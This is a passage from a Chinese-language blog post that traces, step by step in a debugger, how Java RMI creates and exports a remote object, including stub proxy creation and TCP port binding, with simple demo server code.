                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397250591400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RemoteObjImpl</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">UnicastRemoteObject</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">IRemoteObj</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">RemoteObjImpl</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">keywords</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">upKeywords</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">keywords</span><span class="p">.</span><span class="na">toUpperCase</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">upKeywords</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">upKeywords</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397252829700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397252829700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397252829700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397252829700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397252829700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.AlreadyBoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.NotBoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">,</span><span class="w"> </span><span class="n">AlreadyBoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NotBoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">IRemoteObj</span><span class="w"> </span><span class="n">remoteObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RemoteObjImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;remoteObj&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">remoteObj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png" style="max-width: 100%; height: auto;"></p>
<h2 id="3流程原理">3、流程原理<a hidden class="anchor" aria-hidden="true" href="#3流程原理">#</a></h2>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png" style="max-width: 100%; height: auto;"></p>
<h3 id="31-服务端-创建远程服务">3.1 服务端-创建远程服务<a hidden class="anchor" aria-hidden="true" href="#31-服务端-创建远程服务">#</a></h3>
<p>调试分析远程对象的创建过程：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png" style="max-width: 100%; height: auto;"></p>
<p>进入其构造函数，</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png" style="max-width: 100%; height: auto;"></p>
<p>**UnicastRemoteObject **中 ，port 被默认赋值为 0</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png" style="max-width: 100%; height: auto;"></p>
<p>步入  UnicastRemoteObject  类中的 <strong>exportObject</strong> （姑且称为导出对象函数）</p>
<ul>
<li><!-- raw HTML omitted -->public static<!-- raw HTML omitted -->：不需要创建 UnicastRemoteObject  实例也可以调用
<ul>
<li><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png" style="max-width: 100%; height: auto;"></li>
</ul>
</li>
<li>Remote obj：实现了 java.rmi.Remote 接口的对象，</li>
<li>int port： 接收客户端的请求</li>
</ul>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png" style="max-width: 100%; height: auto;"></p>
<p>接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的  <!-- raw HTML omitted -->new UnicastServerRef(port))，<!-- raw HTML omitted --><strong><!-- raw HTML omitted -->UnicastServerRef<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->（称之为服务端引用）<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->var 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 <!-- raw HTML omitted --><strong><!-- raw HTML omitted -->LiveRef<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->,<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png" style="max-width: 100%; height: auto;"></p>
<p>来到 LiveRef 的构造函数</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png" style="max-width: 100%; height: auto;"></p>
<p>这里可以看一下 getLocalEndpoint</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png" style="max-width: 100%; height: auto;"></p>
<p>这里的 <strong>TCPEndpoint</strong> 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png" style="max-width: 100%; height: auto;"></p>
<p>继续跟入 <!-- raw HTML omitted -->this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 <!-- raw HTML omitted -->this，在此处 ep 中有了IP和端口信息</p>
<ul>
<li>Endpoint ep    端点信息（IP、端口、socket）</li>
<li>Channel ch     通信通道（缓存的连接）</li>
<li>isLoacl    是否为本地对象</li>
</ul>
<p>然后这些信息都被存放在 LiveRef 中。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png" style="max-width: 100%; height: auto;"></p>
<p>接下来又调用了父类方法并将 ref 赋值为 var1（var1:<strong>LiveRef@626</strong>）</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png" style="max-width: 100%; height: auto;"></p>
<p>接下来回到  <!-- raw HTML omitted -->return exportObject(obj, new UnicastServerRef(port)); 中的  exportObject 方法<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。<!-- raw HTML omitted --></p>
<p><!-- raw HTML omitted -->之后都使用 sref.exportObject 进行工作完成导出远程对象的操作<!-- raw HTML omitted --></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png" style="max-width: 100%; height: auto;"></p>
<p>而 sref 中封装着 LiveRef@626</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png" style="max-width: 100%; height: auto;"></p>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p><strong><!-- raw HTML omitted -->sref.exportObject <!-- raw HTML omitted --></strong> 的执行过程：</p>
<p><code>stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</code>这一步是创建<strong>客户端代理</strong>的过程。</p>
<blockquote>
<p>（为什么要在服务端创建客户端代理呢？）</p>
<p>这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png" style="max-width: 100%; height: auto;"></p>
</blockquote>
<p>步入 createProxy</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png" style="max-width: 100%; height: auto;"></p>
<p>clientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png" style="max-width: 100%; height: auto;"></p>
<p>此处进行了判断：</p>
<ul>
<li>forceStubUse：如果为 <code>true</code>，就强制使用旧的 <strong>静态 Stub 类</strong>（由 <code>rmic</code> 工具生成的 <code>_Stub.class</code>）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 <code>createStub(...)</code> 去加载和实例化 Stub</li>
<li>ignoreStubClasses：如果为 <code>true</code>，表示忽略静态 Stub 类。这时会尝试用 <strong>动态代理</strong>（<code>java.lang.reflect.Proxy</code>）来生成 Stub</li>
<li>stubClassExists：</li>
</ul>
<div class="code-block-container" id="code-1769750397265883800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397265883800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397265883800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397265883800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397265883800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">stubClassExists</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">remoteClass</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//先看缓存：withoutStubs 用来存放 “已经确定没有 Stub 的类”</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">withoutStubs</span><span class="p">.</span><span class="na">containsKey</span><span class="p">(</span><span class="n">remoteClass</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//尝试用 Class.forName 加载 [远程类名 + &#34;_Stub&#34;] 这个类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">remoteClass</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;_Stub&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                          </span><span class="kc">false</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                          </span><span class="n">remoteClass</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"> </span><span class="c1">//如果能加载成功，说明确实存在 Stub 类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">cnfe</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 如果加载不到，说明这个远程类没有对应的 &#34;_Stub&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//  那么就把它记到 withoutStubs 缓存里，下次查询就直接返回 false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">withoutStubs</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">remoteClass</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span><span class="c1">//如果缓存里已有，或者加载失败，就返回 false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>如果要进入 createStub ，<strong>强制使用 Stub</strong><code>forceStubUse == true</code>，<strong>没有忽略 Stub 并且存在 Stub 类</strong><code>ignoreStubClasses == false``stubClassExists(remoteClass) == true</code></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png" style="max-width: 100%; height: auto;"></p>
<p>下一步创建动态代理</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png" style="max-width: 100%; height: auto;"></p>
<p>其中的 handler 存放 LiveRef@783</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png" style="max-width: 100%; height: auto;"></p>
<p>这样就创建好了动态代理 <strong>stub</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png" style="max-width: 100%; height: auto;"></p>
<p>进入 Target （实际上是将目前创建的东西都封装到一起）</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png" style="max-width: 100%; height: auto;"></p>
<p><strong>客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png" style="max-width: 100%; height: auto;"></p>
<p>接下来，将封装好的 target 发布出去</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png" style="max-width: 100%; height: auto;"></p>
<p>跟到了 TCPTransport 类中的 exportObject</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png" style="max-width: 100%; height: auto;"></p>
<p>listen() 函数先获取 <strong>TCPEndpoint@823</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png" style="max-width: 100%; height: auto;"></p>
<p>准备创建 ServerSocket</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png" style="max-width: 100%; height: auto;"></p>
<p>判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号</p>
<div class="code-block-container" id="code-1769750397270897400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397270897400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397270897400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397270897400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397270897400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">listenPort</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">setDefaultPort</span><span class="p">(</span><span class="n">server</span><span class="p">.</span><span class="na">getLocalPort</span><span class="p">(),</span><span class="w"> </span><span class="n">csf</span><span class="p">,</span><span class="w"> </span><span class="n">ssf</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png" style="max-width: 100%; height: auto;"></p>
<p>进入 server.getLocalPort</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png" style="max-width: 100%; height: auto;"></p>
<p>在这个函数中端口被赋值，此端口随机，</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png" style="max-width: 100%; height: auto;"></p>
<p>这个时候的端口被赋值为 55685</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png" style="max-width: 100%; height: auto;"></p>
<ul>
<li>doPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。</li>
<li>NewThreadAction： 创建一个新的线程</li>
</ul>
